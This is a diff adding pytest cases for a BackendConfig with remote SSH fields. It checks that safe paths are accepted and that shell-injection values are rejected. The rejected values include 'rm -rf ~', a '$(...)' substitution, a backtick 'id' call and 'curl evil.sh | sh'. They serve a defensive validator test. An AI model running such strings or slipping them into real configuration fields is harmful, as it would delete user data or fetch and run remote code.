@@ -1,7 +1,7 @@
 import pytest
 from pydantic import ValidationError
 
-from ruthless.config import Choice, FloatRange, IntRange, RandomConfig, RuthlessConfig
+from ruthless.config import BackendConfig, Choice, FloatRange, IntRange, RandomConfig, RuthlessConfig
 
 
 def test_loads_random_with_mixed_param_space():
@@ -38,3 +38,29 @@ def test_unknown_strategy_kind_rejected():
 def test_float_range_bounds_validated():
     with pytest.raises(ValidationError):
         FloatRange.model_validate({"kind": "float", "lo": 5.0, "hi": 1.0})
+
+
+def test_backend_config_accepts_safe_ssh_fields():
+    cfg = BackendConfig.model_validate(
+        {
+            "type": "remote_ssh",
+            "device": "cuda:0",
+            "ssh_remote_dir": "~/Development/evolve-workspace",
+            "ssh_python_path": "~/Development/evolve-env/bin/python",
+        }
+    )
+    assert cfg.ssh_remote_dir == "~/Development/evolve-workspace"
+
+
+@pytest.mark.parametrize(
+    "field, value",
+    [
+        ("device", "cuda:0; rm -rf ~"),
+        ("device", "$(touch pwned)"),
+        ("ssh_remote_dir", "~/ws && curl evil.sh | sh"),
+        ("ssh_python_path", "/usr/bin/python`id`"),
+    ],
+)
+def test_backend_config_rejects_shell_injection_in_ssh_fields(field, value):
+    with pytest.raises(ValidationError):
+        BackendConfig.model_validate({"type": "remote_ssh", field: value})
